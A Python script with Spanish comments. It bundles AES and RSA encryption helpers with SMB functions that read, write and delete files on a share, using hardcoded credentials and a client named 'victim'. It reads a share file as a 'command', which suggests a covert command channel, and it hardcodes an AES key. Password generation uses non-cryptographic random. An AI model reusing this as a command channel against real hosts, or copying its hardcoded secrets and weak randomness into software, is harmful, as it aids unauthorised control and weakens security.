import tempfile, os, subprocess, time, string, random
from cryptography.hazmat.primitives import hashes, asymmetric
from cryptography.hazmat.primitives import serialization
from smb.SMBConnection import SMBConnection
import hashlib, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

file_path = "lala/"  # Definir la ruta en el recurso compartido

def encrypt_with_symmetric_key(key, plaintext):
    # Generar un IV (Vector de Inicialización) aleatorio para el modo CBC
    iv = os.urandom(16)  # AES usa bloques de 16 bytes

    # Crear un objeto de cifrado AES en modo CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    # Crear un objeto para hacer padding en el mensaje
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    # Cifrar el mensaje
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    # Devolver el IV y el texto cifrado, ambos en formato base64 para su transmisión segura
    return base64.b64encode(iv + ciphertext).decode('utf-8')

# Función para descifrar un mensaje con AES
def decrypt_with_symmetric_key(key, ciphertext_base64):
    # Convertir el texto cifrado de base64 a bytes
    ciphertext_with_iv = base64.b64decode(ciphertext_base64)

    # Extraer el IV y el texto cifrado
    iv = ciphertext_with_iv[:16]
    ciphertext = ciphertext_with_iv[16:]

    # Crear un objeto de cifrado AES en modo CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    # Crear un objeto para quitar el padding del mensaje
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()

    # Descifrar el mensaje
    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # Eliminar el padding del mensaje
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    # Devolver el mensaje descifrado como texto
    return plaintext.decode('utf-8')

def setup_server():
    conn = SMBConnection("smbuser", "smbpass", "server", "victim")
    conn.connect("127.0.0.1", 445)
    return conn

def check_if_file_exists(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    try:
        # Intentar obtener el archivo. Si no existe, lanza una excepción.
        file_attributes = conn.getAttributes(shared_folder, file_path + filename)
        return True  # El archivo existe
    except:
        return False  # El archivo no existe


def delete_file_from_smb(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Intentar borrar el archivo en el recurso compartido
    conn.deleteFiles(shared_folder, file_path + filename)

def write_to_smb(conn, filename, content):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Crear un archivo temporal
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_file.write(content)  # Escribir el contenido en el archivo temporal
        temp_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Subir el archivo al recurso compartido
    with open(temp_filename, 'rb') as temp_file:
        conn.storeFile(shared_folder, file_path + filename, temp_file)  # Usar storeFile para subir

    # Eliminar el archivo temporal
    os.remove(temp_filename)

def read_from_smb(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Crear un archivo temporal para almacenar el archivo descargado
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        local_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Descargar el archivo desde SMB
    with open(local_filename, 'wb') as local_file:
        conn.retrieveFile(shared_folder, file_path + filename, local_file)  # Descargar el archivo desde SMB

    # Leer el archivo descargado
    with open(local_filename, 'r') as f:
        command = f.read()

    # Eliminar el archivo temporal
    os.remove(local_filename)

    return command

def generate_random_password(length=12):
    # Definir los caracteres posibles: letras mayúsculas, minúsculas, dígitos y símbolos
    all_characters = string.ascii_letters + string.digits + string.punctuation

    # Generar la contraseña aleatoria
    password = ''.join(random.choice(all_characters) for _ in range(length))
    return password

def load_public_key(public_key_pem):
    # Asegúrate de que los datos leídos sean en formato bytes
    return serialization.load_pem_public_key(public_key_pem)

# Función para cifrar un mensaje con la clave pública
def encrypt_with_public_key(public_key, message):
    ciphertext = public_key.encrypt(
        message.encode(),  # Codificar el mensaje a bytes
        asymmetric.padding.OAEP(
            mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return ciphertext

def main():
    with open("result.txt", "rb") as key_file:
        text = key_file.read()
    command = decrypt_with_symmetric_key('|vk^3;-8.)&5FI0S'.encode('UTF-8'), text)
    print(command)

if __name__ == "__main__":
    main()
